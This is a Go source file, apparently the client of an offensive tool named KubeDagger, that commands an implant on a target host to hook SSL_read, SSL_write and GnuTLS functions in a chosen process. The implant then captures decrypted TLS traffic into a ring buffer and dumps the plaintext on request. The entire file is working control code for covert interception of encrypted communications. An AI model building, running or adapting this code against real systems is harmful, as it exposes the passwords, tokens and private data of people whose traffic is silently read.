package tls_intercept

import (
	"encoding/json"
	"fmt"
	"os"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/shared"
)

type TLSResult struct {
	Action  string              `json:"action"`
	Actions []shared.ActionInfo `json:"actions"`
	Success bool                `json:"success"`
}

func Execute(target, action, targetPID, lib, output string) error {
	var result *TLSResult

	switch action {
	case "start":
		result = startCapture(target, targetPID, lib)
	case "stop":
		result = stopCapture(target, targetPID)
	case "dump":
		result = dumpCapture(target, targetPID)
	default:
		return fmt.Errorf("unsupported action: %s (use start, stop, or dump)", action)
	}

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func startCapture(target, pid, lib string) *TLSResult {
	result := &TLSResult{Action: "start"}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"attach_ssl_read_uprobe",
			"attach uprobe to SSL_read/gnutls_record_recv to capture decrypted inbound data",
			"tls_attach_read",
		},
		{
			"attach_ssl_write_uprobe",
			"attach uprobe to SSL_write/gnutls_record_send to capture plaintext outbound data",
			"tls_attach_write",
		},
		{
			"configure_ringbuf_capture",
			"initialize ring buffer map for streaming captured TLS data to userspace",
			"tls_init_ringbuf",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + pid + "#" + lib
		status := shared.SendCommand(target, "/tls_intercept", cmd)
		result.Actions = append(result.Actions, shared.ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = shared.AllSucceeded(result.Actions)
	return result
}

func stopCapture(target, pid string) *TLSResult {
	result := &TLSResult{Action: "stop"}

	cmd := "tls_detach_all#" + pid
	status := shared.SendCommand(target, "/tls_intercept", cmd)
	result.Actions = append(result.Actions, shared.ActionInfo{
		Name:   "detach_uprobes",
		Status: status,
		Detail: "detach all TLS uprobes from target process",
	})

	result.Success = shared.AllSucceeded(result.Actions)
	return result
}

func dumpCapture(target, pid string) *TLSResult {
	result := &TLSResult{Action: "dump"}

	cmd := "tls_dump_ringbuf#" + pid
	status := shared.SendCommand(target, "/tls_intercept", cmd)
	result.Actions = append(result.Actions, shared.ActionInfo{
		Name:   "dump_captured_data",
		Status: status,
		Detail: "read captured plaintext from ring buffer",
	})

	result.Success = shared.AllSucceeded(result.Actions)
	return result
}
